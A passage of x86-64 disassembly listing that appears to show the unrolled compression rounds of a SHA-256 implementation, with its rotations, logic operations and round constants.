    6d8c6ec3:	44 89 c2             	mov    %r8d,%edx
    6d8c6ec6:	41 01 fe             	add    %edi,%r14d
    6d8c6ec9:	c1 ca 02             	ror    $0x2,%edx
    6d8c6ecc:	42 8d 3c 30          	lea    (%rax,%r14,1),%edi
    6d8c6ed0:	44 89 c0             	mov    %r8d,%eax
    6d8c6ed3:	c1 c8 0d             	ror    $0xd,%eax
    6d8c6ed6:	31 d0                	xor    %edx,%eax
    6d8c6ed8:	44 89 c2             	mov    %r8d,%edx
    6d8c6edb:	c1 c2 0a             	rol    $0xa,%edx
    6d8c6ede:	31 d0                	xor    %edx,%eax
    6d8c6ee0:	44 89 d2             	mov    %r10d,%edx
    6d8c6ee3:	44 31 ca             	xor    %r9d,%edx
    6d8c6ee6:	44 21 c2             	and    %r8d,%edx
    6d8c6ee9:	44 31 fa             	xor    %r15d,%edx
    6d8c6eec:	45 89 cf             	mov    %r9d,%r15d
    6d8c6eef:	01 c2                	add    %eax,%edx
    6d8c6ef1:	89 f8                	mov    %edi,%eax
    6d8c6ef3:	44 01 f2             	add    %r14d,%edx
    6d8c6ef6:	41 89 fe             	mov    %edi,%r14d
    6d8c6ef9:	c1 c8 06             	ror    $0x6,%eax
    6d8c6efc:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6f00:	44 31 f0             	xor    %r14d,%eax
    6d8c6f03:	41 89 fe             	mov    %edi,%r14d
    6d8c6f06:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6f0a:	41 31 c6             	xor    %eax,%r14d
    6d8c6f0d:	8b 84 24 90 00 00 00 	mov    0x90(%rsp),%eax
    6d8c6f14:	45 8d ac 05 54 73 0a 	lea    0x650a7354(%r13,%rax,1),%r13d
    6d8c6f1b:	65 
    6d8c6f1c:	89 f8                	mov    %edi,%eax
    6d8c6f1e:	45 01 f5             	add    %r14d,%r13d
    6d8c6f21:	f7 d0                	not    %eax
    6d8c6f23:	41 89 ee             	mov    %ebp,%r14d
    6d8c6f26:	44 21 e0             	and    %r12d,%eax
    6d8c6f29:	41 21 fe             	and    %edi,%r14d
    6d8c6f2c:	41 31 c6             	xor    %eax,%r14d
    6d8c6f2f:	89 d0                	mov    %edx,%eax
    6d8c6f31:	45 01 ee             	add    %r13d,%r14d
    6d8c6f34:	c1 c8 02             	ror    $0x2,%eax
    6d8c6f37:	47 8d 2c 32          	lea    (%r10,%r14,1),%r13d
    6d8c6f3b:	41 89 d2             	mov    %edx,%r10d
    6d8c6f3e:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c6f42:	41 31 c2             	xor    %eax,%r10d
    6d8c6f45:	89 d0                	mov    %edx,%eax
    6d8c6f47:	45 21 c7             	and    %r8d,%r15d
    6d8c6f4a:	c1 c0 0a             	rol    $0xa,%eax
    6d8c6f4d:	41 31 c2             	xor    %eax,%r10d
    6d8c6f50:	44 89 c8             	mov    %r9d,%eax
    6d8c6f53:	44 31 c0             	xor    %r8d,%eax
    6d8c6f56:	21 d0                	and    %edx,%eax
    6d8c6f58:	44 31 f8             	xor    %r15d,%eax
    6d8c6f5b:	45 89 c7             	mov    %r8d,%r15d
    6d8c6f5e:	44 01 d0             	add    %r10d,%eax
    6d8c6f61:	45 89 ea             	mov    %r13d,%r10d
    6d8c6f64:	41 21 d7             	and    %edx,%r15d
    6d8c6f67:	44 01 f0             	add    %r14d,%eax
    6d8c6f6a:	45 89 ee             	mov    %r13d,%r14d
    6d8c6f6d:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c6f71:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6f75:	45 31 f2             	xor    %r14d,%r10d
    6d8c6f78:	45 89 ee             	mov    %r13d,%r14d
    6d8c6f7b:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6f7f:	45 31 d6             	xor    %r10d,%r14d
    6d8c6f82:	44 8b 94 24 94 00 00 	mov    0x94(%rsp),%r10d
    6d8c6f89:	00 
    6d8c6f8a:	47 8d a4 14 bb 0a 6a 	lea    0x766a0abb(%r12,%r10,1),%r12d
    6d8c6f91:	76 
    6d8c6f92:	45 89 ea             	mov    %r13d,%r10d
    6d8c6f95:	45 01 f4             	add    %r14d,%r12d
    6d8c6f98:	41 f7 d2             	not    %r10d
    6d8c6f9b:	41 89 fe             	mov    %edi,%r14d
    6d8c6f9e:	41 21 ea             	and    %ebp,%r10d
    6d8c6fa1:	45 21 ee             	and    %r13d,%r14d
    6d8c6fa4:	45 31 d6             	xor    %r10d,%r14d
    6d8c6fa7:	41 89 c2             	mov    %eax,%r10d
    6d8c6faa:	45 01 e6             	add    %r12d,%r14d
    6d8c6fad:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c6fb1:	47 8d 24 31          	lea    (%r9,%r14,1),%r12d
    6d8c6fb5:	41 89 c1             	mov    %eax,%r9d
    6d8c6fb8:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c6fbc:	45 31 d1             	xor    %r10d,%r9d
    6d8c6fbf:	41 89 c2             	mov    %eax,%r10d
    6d8c6fc2:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6fc6:	45 31 d1             	xor    %r10d,%r9d
    6d8c6fc9:	45 89 c2             	mov    %r8d,%r10d
    6d8c6fcc:	41 31 d2             	xor    %edx,%r10d
    6d8c6fcf:	41 21 c2             	and    %eax,%r10d
    6d8c6fd2:	45 31 fa             	xor    %r15d,%r10d
    6d8c6fd5:	41 89 d7             	mov    %edx,%r15d
    6d8c6fd8:	45 01 ca             	add    %r9d,%r10d
    6d8c6fdb:	45 89 e1             	mov    %r12d,%r9d
    6d8c6fde:	45 01 f2             	add    %r14d,%r10d
    6d8c6fe1:	45 89 e6             	mov    %r12d,%r14d
    6d8c6fe4:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c6fe8:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6fec:	45 31 f1             	xor    %r14d,%r9d
    6d8c6fef:	45 89 e6             	mov    %r12d,%r14d
    6d8c6ff2:	41 21 c7             	and    %eax,%r15d
    6d8c6ff5:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6ff9:	45 31 ce             	xor    %r9d,%r14d
    6d8c6ffc:	44 8b 8c 24 98 00 00 	mov    0x98(%rsp),%r9d
    6d8c7003:	00 
    6d8c7004:	42 8d ac 0d 2e c9 c2 	lea    -0x7e3d36d2(%rbp,%r9,1),%ebp
    6d8c700b:	81 
    6d8c700c:	45 89 e1             	mov    %r12d,%r9d
    6d8c700f:	44 01 f5             	add    %r14d,%ebp
    6d8c7012:	41 f7 d1             	not    %r9d
    6d8c7015:	45 89 ee             	mov    %r13d,%r14d
    6d8c7018:	41 21 f9             	and    %edi,%r9d
    6d8c701b:	45 21 e6             	and    %r12d,%r14d
    6d8c701e:	45 31 ce             	xor    %r9d,%r14d
    6d8c7021:	45 89 d1             	mov    %r10d,%r9d
    6d8c7024:	41 01 ee             	add    %ebp,%r14d
    6d8c7027:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c702b:	43 8d 2c 30          	lea    (%r8,%r14,1),%ebp
    6d8c702f:	45 89 d0             	mov    %r10d,%r8d
    6d8c7032:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c7036:	45 31 c8             	xor    %r9d,%r8d
    6d8c7039:	45 89 d1             	mov    %r10d,%r9d
    6d8c703c:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c7040:	45 31 c8             	xor    %r9d,%r8d
    6d8c7043:	41 89 d1             	mov    %edx,%r9d
    6d8c7046:	41 31 c1             	xor    %eax,%r9d
    6d8c7049:	45 21 d1             	and    %r10d,%r9d
    6d8c704c:	45 31 f9             	xor    %r15d,%r9d
    6d8c704f:	41 89 c7             	mov    %eax,%r15d
    6d8c7052:	45 01 c1             	add    %r8d,%r9d
    6d8c7055:	41 89 e8             	mov    %ebp,%r8d
    6d8c7058:	45 01 f1             	add    %r14d,%r9d
    6d8c705b:	41 89 ee             	mov    %ebp,%r14d
    6d8c705e:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c7062:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c7066:	45 31 f0             	xor    %r14d,%r8d
    6d8c7069:	41 89 ee             	mov    %ebp,%r14d
    6d8c706c:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7070:	45 31 c6             	xor    %r8d,%r14d
    6d8c7073:	44 8b 84 24 9c 00 00 	mov    0x9c(%rsp),%r8d
    6d8c707a:	00 
    6d8c707b:	42 8d bc 07 85 2c 72 	lea    -0x6d8dd37b(%rdi,%r8,1),%edi
    6d8c7082:	92 
    6d8c7083:	41 89 e8             	mov    %ebp,%r8d
    6d8c7086:	44 01 f7             	add    %r14d,%edi
    6d8c7089:	41 f7 d0             	not    %r8d
    6d8c708c:	45 89 e6             	mov    %r12d,%r14d
    6d8c708f:	45 21 e8             	and    %r13d,%r8d
    6d8c7092:	41 21 ee             	and    %ebp,%r14d
    6d8c7095:	45 31 c6             	xor    %r8d,%r14d
    6d8c7098:	45 89 c8             	mov    %r9d,%r8d
    6d8c709b:	41 01 fe             	add    %edi,%r14d
    6d8c709e:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c70a2:	42 8d 3c 32          	lea    (%rdx,%r14,1),%edi
    6d8c70a6:	44 89 ca             	mov    %r9d,%edx
    6d8c70a9:	c1 ca 0d             	ror    $0xd,%edx
    6d8c70ac:	44 31 c2             	xor    %r8d,%edx
    6d8c70af:	45 89 c8             	mov    %r9d,%r8d
    6d8c70b2:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c70b6:	45 21 d7             	and    %r10d,%r15d
    6d8c70b9:	44 31 c2             	xor    %r8d,%edx
    6d8c70bc:	41 89 c0             	mov    %eax,%r8d
    6d8c70bf:	45 31 d0             	xor    %r10d,%r8d
    6d8c70c2:	45 21 c8             	and    %r9d,%r8d
    6d8c70c5:	45 31 f8             	xor    %r15d,%r8d
    6d8c70c8:	45 89 d7             	mov    %r10d,%r15d
    6d8c70cb:	41 01 d0             	add    %edx,%r8d
    6d8c70ce:	89 fa                	mov    %edi,%edx
    6d8c70d0:	45 21 cf             	and    %r9d,%r15d
    6d8c70d3:	45 01 f0             	add    %r14d,%r8d
    6d8c70d6:	41 89 fe             	mov    %edi,%r14d
    6d8c70d9:	c1 ca 06             	ror    $0x6,%edx
    6d8c70dc:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c70e0:	44 31 f2             	xor    %r14d,%edx
    6d8c70e3:	41 89 fe             	mov    %edi,%r14d
    6d8c70e6:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c70ea:	41 31 d6             	xor    %edx,%r14d
    6d8c70ed:	8b 94 24 a0 00 00 00 	mov    0xa0(%rsp),%edx
    6d8c70f4:	45 8d ac 15 a1 e8 bf 	lea    -0x5d40175f(%r13,%rdx,1),%r13d
    6d8c70fb:	a2 
    6d8c70fc:	89 fa                	mov    %edi,%edx
    6d8c70fe:	45 01 f5             	add    %r14d,%r13d
    6d8c7101:	f7 d2                	not    %edx
    6d8c7103:	41 89 ee             	mov    %ebp,%r14d
    6d8c7106:	44 21 e2             	and    %r12d,%edx
    6d8c7109:	41 21 fe             	and    %edi,%r14d
    6d8c710c:	41 31 d6             	xor    %edx,%r14d
    6d8c710f:	44 89 c2             	mov    %r8d,%edx
    6d8c7112:	45 01 ee             	add    %r13d,%r14d
    6d8c7115:	c1 ca 02             	ror    $0x2,%edx
    6d8c7118:	46 8d 2c 30          	lea    (%rax,%r14,1),%r13d
    6d8c711c:	44 89 c0             	mov    %r8d,%eax
    6d8c711f:	c1 c8 0d             	ror    $0xd,%eax
    6d8c7122:	31 d0                	xor    %edx,%eax
    6d8c7124:	44 89 c2             	mov    %r8d,%edx
    6d8c7127:	c1 c2 0a             	rol    $0xa,%edx
    6d8c712a:	31 d0                	xor    %edx,%eax
    6d8c712c:	44 89 d2             	mov    %r10d,%edx
    6d8c712f:	44 31 ca             	xor    %r9d,%edx
    6d8c7132:	44 21 c2             	and    %r8d,%edx
    6d8c7135:	44 31 fa             	xor    %r15d,%edx
    6d8c7138:	45 89 cf             	mov    %r9d,%r15d
    6d8c713b:	01 c2                	add    %eax,%edx
    6d8c713d:	44 89 e8             	mov    %r13d,%eax
    6d8c7140:	44 01 f2             	add    %r14d,%edx
    6d8c7143:	45 89 ee             	mov    %r13d,%r14d
    6d8c7146:	c1 c8 06             	ror    $0x6,%eax
    6d8c7149:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c714d:	44 31 f0             	xor    %r14d,%eax
    6d8c7150:	45 89 ee             	mov    %r13d,%r14d
    6d8c7153:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7157:	45 21 c7             	and    %r8d,%r15d
    6d8c715a:	41 31 c6             	xor    %eax,%r14d
    6d8c715d:	8b 84 24 a4 00 00 00 	mov    0xa4(%rsp),%eax
    6d8c7164:	45 8d a4 04 4b 66 1a 	lea    -0x57e599b5(%r12,%rax,1),%r12d
    6d8c716b:	a8 
    6d8c716c:	44 89 e8             	mov    %r13d,%eax
    6d8c716f:	45 01 f4             	add    %r14d,%r12d
    6d8c7172:	f7 d0                	not    %eax
    6d8c7174:	41 89 fe             	mov    %edi,%r14d
    6d8c7177:	21 e8                	and    %ebp,%eax
    6d8c7179:	45 21 ee             	and    %r13d,%r14d
    6d8c717c:	41 31 c6             	xor    %eax,%r14d
    6d8c717f:	89 d0                	mov    %edx,%eax
    6d8c7181:	45 01 e6             	add    %r12d,%r14d
    6d8c7184:	c1 c8 02             	ror    $0x2,%eax
    6d8c7187:	47 8d 24 32          	lea    (%r10,%r14,1),%r12d
    6d8c718b:	41 89 d2             	mov    %edx,%r10d
    6d8c718e:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c7192:	41 31 c2             	xor    %eax,%r10d
    6d8c7195:	89 d0                	mov    %edx,%eax
    6d8c7197:	c1 c0 0a             	rol    $0xa,%eax
    6d8c719a:	41 31 c2             	xor    %eax,%r10d
    6d8c719d:	44 89 c8             	mov    %r9d,%eax
    6d8c71a0:	44 31 c0             	xor    %r8d,%eax
    6d8c71a3:	21 d0                	and    %edx,%eax
    6d8c71a5:	44 31 f8             	xor    %r15d,%eax
    6d8c71a8:	45 89 c7             	mov    %r8d,%r15d
    6d8c71ab:	44 01 d0             	add    %r10d,%eax
    6d8c71ae:	45 89 e2             	mov    %r12d,%r10d
    6d8c71b1:	44 01 f0             	add    %r14d,%eax
    6d8c71b4:	45 89 e6             	mov    %r12d,%r14d
    6d8c71b7:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c71bb:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c71bf:	45 31 f2             	xor    %r14d,%r10d
    6d8c71c2:	45 89 e6             	mov    %r12d,%r14d
    6d8c71c5:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c71c9:	45 31 d6             	xor    %r10d,%r14d
    6d8c71cc:	44 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%r10d
    6d8c71d3:	00 
    6d8c71d4:	42 8d ac 15 70 8b 4b 	lea    -0x3db47490(%rbp,%r10,1),%ebp
    6d8c71db:	c2 
    6d8c71dc:	45 89 e2             	mov    %r12d,%r10d
    6d8c71df:	44 01 f5             	add    %r14d,%ebp
    6d8c71e2:	41 f7 d2             	not    %r10d
    6d8c71e5:	45 89 ee             	mov    %r13d,%r14d
    6d8c71e8:	41 21 fa             	and    %edi,%r10d
    6d8c71eb:	45 21 e6             	and    %r12d,%r14d
    6d8c71ee:	45 31 d6             	xor    %r10d,%r14d
    6d8c71f1:	41 89 c2             	mov    %eax,%r10d
    6d8c71f4:	41 01 ee             	add    %ebp,%r14d
    6d8c71f7:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c71fb:	43 8d 2c 31          	lea    (%r9,%r14,1),%ebp
    6d8c71ff:	41 89 c1             	mov    %eax,%r9d
    6d8c7202:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c7206:	45 31 d1             	xor    %r10d,%r9d
    6d8c7209:	41 89 c2             	mov    %eax,%r10d
    6d8c720c:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c7210:	45 31 d1             	xor    %r10d,%r9d
    6d8c7213:	45 89 c2             	mov    %r8d,%r10d
    6d8c7216:	41 21 d7             	and    %edx,%r15d
    6d8c7219:	41 31 d2             	xor    %edx,%r10d
    6d8c721c:	41 21 c2             	and    %eax,%r10d
    6d8c721f:	45 31 fa             	xor    %r15d,%r10d
    6d8c7222:	41 89 d7             	mov    %edx,%r15d
    6d8c7225:	45 01 ca             	add    %r9d,%r10d
    6d8c7228:	41 89 e9             	mov    %ebp,%r9d
    6d8c722b:	41 21 c7             	and    %eax,%r15d
    6d8c722e:	45 01 f2             	add    %r14d,%r10d
    6d8c7231:	41 89 ee             	mov    %ebp,%r14d
    6d8c7234:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c7238:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c723c:	45 31 f1             	xor    %r14d,%r9d
    6d8c723f:	41 89 ee             	mov    %ebp,%r14d
    6d8c7242:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7246:	45 31 ce             	xor    %r9d,%r14d
    6d8c7249:	44 8b 8c 24 ac 00 00 	mov    0xac(%rsp),%r9d
    6d8c7250:	00 
    6d8c7251:	42 8d bc 0f a3 51 6c 	lea    -0x3893ae5d(%rdi,%r9,1),%edi
    6d8c7258:	c7 
    6d8c7259:	41 89 e9             	mov    %ebp,%r9d
    6d8c725c:	44 01 f7             	add    %r14d,%edi
    6d8c725f:	41 f7 d1             	not    %r9d
    6d8c7262:	45 89 e6             	mov    %r12d,%r14d
    6d8c7265:	45 21 e9             	and    %r13d,%r9d
    6d8c7268:	41 21 ee             	and    %ebp,%r14d
    6d8c726b:	45 31 ce             	xor    %r9d,%r14d
    6d8c726e:	45 89 d1             	mov    %r10d,%r9d
    6d8c7271:	41 01 fe             	add    %edi,%r14d
    6d8c7274:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c7278:	43 8d 3c 30          	lea    (%r8,%r14,1),%edi
    6d8c727c:	45 89 d0             	mov    %r10d,%r8d
    6d8c727f:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c7283:	45 31 c8             	xor    %r9d,%r8d
    6d8c7286:	45 89 d1             	mov    %r10d,%r9d
    6d8c7289:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c728d:	45 31 c8             	xor    %r9d,%r8d
    6d8c7290:	41 89 d1             	mov    %edx,%r9d
    6d8c7293:	41 31 c1             	xor    %eax,%r9d
    6d8c7296:	45 21 d1             	and    %r10d,%r9d
    6d8c7299:	45 31 f9             	xor    %r15d,%r9d
    6d8c729c:	41 89 c7             	mov    %eax,%r15d
    6d8c729f:	45 01 c1             	add    %r8d,%r9d
    6d8c72a2:	41 89 f8             	mov    %edi,%r8d
    6d8c72a5:	45 01 f1             	add    %r14d,%r9d
    6d8c72a8:	41 89 fe             	mov    %edi,%r14d
    6d8c72ab:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c72af:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c72b3:	45 31 f0             	xor    %r14d,%r8d
    6d8c72b6:	41 89 fe             	mov    %edi,%r14d
    6d8c72b9:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c72bd:	45 31 c6             	xor    %r8d,%r14d
    6d8c72c0:	44 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8d
    6d8c72c7:	00 
    6d8c72c8:	45 21 d7             	and    %r10d,%r15d
    6d8c72cb:	47 8d ac 05 19 e8 92 	lea    -0x2e6d17e7(%r13,%r8,1),%r13d
    6d8c72d2:	d1 
    6d8c72d3:	41 89 f8             	mov    %edi,%r8d
    6d8c72d6:	45 01 f5             	add    %r14d,%r13d
    6d8c72d9:	41 f7 d0             	not    %r8d
    6d8c72dc:	41 89 ee             	mov    %ebp,%r14d
    6d8c72df:	45 21 e0             	and    %r12d,%r8d
    6d8c72e2:	41 21 fe             	and    %edi,%r14d
    6d8c72e5:	45 31 c6             	xor    %r8d,%r14d
    6d8c72e8:	45 89 c8             	mov    %r9d,%r8d
    6d8c72eb:	45 01 ee             	add    %r13d,%r14d
    6d8c72ee:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c72f2:	46 8d 2c 32          	lea    (%rdx,%r14,1),%r13d
    6d8c72f6:	44 89 ca             	mov    %r9d,%edx
    6d8c72f9:	c1 ca 0d             	ror    $0xd,%edx
    6d8c72fc:	44 31 c2             	xor    %r8d,%edx
    6d8c72ff:	45 89 c8             	mov    %r9d,%r8d
    6d8c7302:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c7306:	44 31 c2             	xor    %r8d,%edx
    6d8c7309:	41 89 c0             	mov    %eax,%r8d
    6d8c730c:	45 31 d0             	xor    %r10d,%r8d
    6d8c730f:	45 21 c8             	and    %r9d,%r8d
    6d8c7312:	45 31 f8             	xor    %r15d,%r8d
    6d8c7315:	45 89 d7             	mov    %r10d,%r15d
    6d8c7318:	41 01 d0             	add    %edx,%r8d
    6d8c731b:	44 89 ea             	mov    %r13d,%edx
    6d8c731e:	45 01 f0             	add    %r14d,%r8d
    6d8c7321:	45 89 ee             	mov    %r13d,%r14d
    6d8c7324:	c1 ca 06             	ror    $0x6,%edx
    6d8c7327:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c732b:	44 31 f2             	xor    %r14d,%edx
    6d8c732e:	45 89 ee             	mov    %r13d,%r14d
    6d8c7331:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7335:	41 31 d6             	xor    %edx,%r14d
    6d8c7338:	8b 94 24 b4 00 00 00 	mov    0xb4(%rsp),%edx
    6d8c733f:	45 8d a4 14 24 06 99 	lea    -0x2966f9dc(%r12,%rdx,1),%r12d
    6d8c7346:	d6 
    6d8c7347:	44 89 ea             	mov    %r13d,%edx
    6d8c734a:	45 01 f4             	add    %r14d,%r12d
    6d8c734d:	f7 d2                	not    %edx
    6d8c734f:	41 89 fe             	mov    %edi,%r14d
    6d8c7352:	21 ea                	and    %ebp,%edx
    6d8c7354:	45 21 ee             	and    %r13d,%r14d
    6d8c7357:	41 31 d6             	xor    %edx,%r14d
    6d8c735a:	44 89 c2             	mov    %r8d,%edx
    6d8c735d:	45 01 e6             	add    %r12d,%r14d
    6d8c7360:	c1 ca 02             	ror    $0x2,%edx
    6d8c7363:	46 8d 24 30          	lea    (%rax,%r14,1),%r12d
    6d8c7367:	44 89 c0             	mov    %r8d,%eax
    6d8c736a:	c1 c8 0d             	ror    $0xd,%eax
    6d8c736d:	31 d0                	xor    %edx,%eax
    6d8c736f:	44 89 c2             	mov    %r8d,%edx
    6d8c7372:	c1 c2 0a             	rol    $0xa,%edx
    6d8c7375:	31 d0                	xor    %edx,%eax
    6d8c7377:	44 89 d2             	mov    %r10d,%edx
    6d8c737a:	44 31 ca             	xor    %r9d,%edx
    6d8c737d:	45 21 cf             	and    %r9d,%r15d
    6d8c7380:	44 21 c2             	and    %r8d,%edx
    6d8c7383:	44 31 fa             	xor    %r15d,%edx
    6d8c7386:	45 89 cf             	mov    %r9d,%r15d
    6d8c7389:	01 c2                	add    %eax,%edx
    6d8c738b:	44 89 e0             	mov    %r12d,%eax
    6d8c738e:	45 21 c7             	and    %r8d,%r15d
    6d8c7391:	44 01 f2             	add    %r14d,%edx
    6d8c7394:	45 89 e6             	mov    %r12d,%r14d
    6d8c7397:	c1 c8 06             	ror    $0x6,%eax
    6d8c739a:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c739e:	44 31 f0             	xor    %r14d,%eax
    6d8c73a1:	45 89 e6             	mov    %r12d,%r14d
    6d8c73a4:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c73a8:	41 31 c6             	xor    %eax,%r14d
    6d8c73ab:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
    6d8c73b2:	8d ac 05 85 35 0e f4 	lea    -0xbf1ca7b(%rbp,%rax,1),%ebp
    6d8c73b9:	44 89 e0             	mov    %r12d,%eax
    6d8c73bc:	44 01 f5             	add    %r14d,%ebp
    6d8c73bf:	f7 d0                	not    %eax
    6d8c73c1:	45 89 ee             	mov    %r13d,%r14d
    6d8c73c4:	21 f8                	and    %edi,%eax
    6d8c73c6:	45 21 e6             	and    %r12d,%r14d
    6d8c73c9:	41 31 c6             	xor    %eax,%r14d
    6d8c73cc:	89 d0                	mov    %edx,%eax
    6d8c73ce:	41 01 ee             	add    %ebp,%r14d
    6d8c73d1:	c1 c8 02             	ror    $0x2,%eax
    6d8c73d4:	43 8d 2c 32          	lea    (%r10,%r14,1),%ebp
    6d8c73d8:	41 89 d2             	mov    %edx,%r10d
    6d8c73db:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c73df:	41 31 c2             	xor    %eax,%r10d
    6d8c73e2:	89 d0                	mov    %edx,%eax
    6d8c73e4:	c1 c0 0a             	rol    $0xa,%eax
    6d8c73e7:	41 31 c2             	xor    %eax,%r10d
    6d8c73ea:	44 89 c8             	mov    %r9d,%eax
    6d8c73ed:	44 31 c0             	xor    %r8d,%eax
    6d8c73f0:	21 d0                	and    %edx,%eax
    6d8c73f2:	44 31 f8             	xor    %r15d,%eax
    6d8c73f5:	45 89 c7             	mov    %r8d,%r15d
    6d8c73f8:	44 01 d0             	add    %r10d,%eax
    6d8c73fb:	41 89 ea             	mov    %ebp,%r10d
    6d8c73fe:	44 01 f0             	add    %r14d,%eax
    6d8c7401:	41 89 ee             	mov    %ebp,%r14d
    6d8c7404:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c7408:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c740c:	45 31 f2             	xor    %r14d,%r10d
    6d8c740f:	41 89 ee             	mov    %ebp,%r14d
    6d8c7412:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7416:	45 31 d6             	xor    %r10d,%r14d
    6d8c7419:	44 8b 94 24 bc 00 00 	mov    0xbc(%rsp),%r10d
    6d8c7420:	00 
    6d8c7421:	42 8d bc 17 70 a0 6a 	lea    0x106aa070(%rdi,%r10,1),%edi
    6d8c7428:	10 
    6d8c7429:	41 89 ea             	mov    %ebp,%r10d
    6d8c742c:	44 01 f7             	add    %r14d,%edi
    6d8c742f:	41 f7 d2             	not    %r10d
    6d8c7432:	45 89 e6             	mov    %r12d,%r14d
    6d8c7435:	45 21 ea             	and    %r13d,%r10d
    6d8c7438:	41 21 ee             	and    %ebp,%r14d
    6d8c743b:	41 21 d7             	and    %edx,%r15d
    6d8c743e:	45 31 d6             	xor    %r10d,%r14d
    6d8c7441:	41 89 c2             	mov    %eax,%r10d
    6d8c7444:	41 01 fe             	add    %edi,%r14d
    6d8c7447:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c744b:	43 8d 3c 31          	lea    (%r9,%r14,1),%edi
    6d8c744f:	41 89 c1             	mov    %eax,%r9d
    6d8c7452:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c7456:	45 31 d1             	xor    %r10d,%r9d
    6d8c7459:	41 89 c2             	mov    %eax,%r10d
    6d8c745c:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c7460:	45 31 d1             	xor    %r10d,%r9d
    6d8c7463:	45 89 c2             	mov    %r8d,%r10d
    6d8c7466:	41 31 d2             	xor    %edx,%r10d
    6d8c7469:	41 21 c2             	and    %eax,%r10d
    6d8c746c:	45 31 fa             	xor    %r15d,%r10d
    6d8c746f:	41 89 d7             	mov    %edx,%r15d
    6d8c7472:	45 01 ca             	add    %r9d,%r10d
    6d8c7475:	41 89 f9             	mov    %edi,%r9d
    6d8c7478:	45 01 f2             	add    %r14d,%r10d
    6d8c747b:	41 89 fe             	mov    %edi,%r14d
    6d8c747e:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c7482:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c7486:	45 31 f1             	xor    %r14d,%r9d
    6d8c7489:	41 89 fe             	mov    %edi,%r14d
    6d8c748c:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7490:	45 31 ce             	xor    %r9d,%r14d
    6d8c7493:	44 8b 8c 24 c0 00 00 	mov    0xc0(%rsp),%r9d
    6d8c749a:	00 
    6d8c749b:	47 8d ac 0d 16 c1 a4 	lea    0x19a4c116(%r13,%r9,1),%r13d
    6d8c74a2:	19 
    6d8c74a3:	41 89 f9             	mov    %edi,%r9d
    6d8c74a6:	45 01 f5             	add    %r14d,%r13d
    6d8c74a9:	41 f7 d1             	not    %r9d
    6d8c74ac:	41 89 ee             	mov    %ebp,%r14d
    6d8c74af:	45 21 e1             	and    %r12d,%r9d
    6d8c74b2:	41 21 fe             	and    %edi,%r14d
    6d8c74b5:	45 31 ce             	xor    %r9d,%r14d
    6d8c74b8:	45 89 d1             	mov    %r10d,%r9d
    6d8c74bb:	45 01 ee             	add    %r13d,%r14d
    6d8c74be:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c74c2:	47 8d 2c 30          	lea    (%r8,%r14,1),%r13d
    6d8c74c6:	45 89 d0             	mov    %r10d,%r8d
    6d8c74c9:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c74cd:	45 31 c8             	xor    %r9d,%r8d
    6d8c74d0:	45 89 d1             	mov    %r10d,%r9d
    6d8c74d3:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c74d7:	45 31 c8             	xor    %r9d,%r8d
    6d8c74da:	41 89 d1             	mov    %edx,%r9d
    6d8c74dd:	41 31 c1             	xor    %eax,%r9d
    6d8c74e0:	45 21 d1             	and    %r10d,%r9d
    6d8c74e3:	41 21 c7             	and    %eax,%r15d
